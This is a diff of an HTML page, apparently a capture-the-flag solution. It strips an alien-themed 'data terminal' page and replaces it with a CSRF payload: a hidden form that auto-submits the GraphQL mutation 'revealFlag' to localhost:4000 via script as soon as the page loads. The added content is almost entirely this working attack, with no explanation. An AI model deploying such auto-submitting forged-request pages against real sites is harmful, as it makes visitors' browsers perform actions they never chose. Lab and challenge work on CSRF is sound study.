@@ -3,39 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Extraterrestrial Data Terminal</title>
-    <style>
-        body {
-            font-family: "Courier New", monospace;
-            text-align: center;
-            margin: 50px;
-            background-color: #0d0d0d;
-            color: #33ff33;
-        }
-        h1 {
-            color: #ff3333;
-        }
-        .container {
-            max-width: 600px;
-            margin: auto;
-            padding: 20px;
-            border: 2px solid #33ff33;
-            border-radius: 10px;
-            background-color: #1a1a1a;
-        }
-        .hint {
-            margin-top: 20px;
-            font-style: italic;
-            color: #ff9933;
-        }
-    </style>
+    <title>Alien Uplink</title>
 </head>
 <body>
-    <div class="container">
-        <h1>Extraterrestrial Data Terminal</h1>
-        <p>Connection established with unidentified system.</p>
-	<p>Foreign intelligence detected.</p><p>Probing for classified graph query language data...</p>
-        <p class="hint">"Access requires secret queries."</p>
-    </div>
+    <h1>Loading alien transmission...</h1>
+
+    <form id="csrfForm" action="http://localhost:4000/graphql" method="POST">
+        <input type="hidden" name="query" value='mutation { revealFlag }'>
+    </form>
+
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
 </body>
 </html>
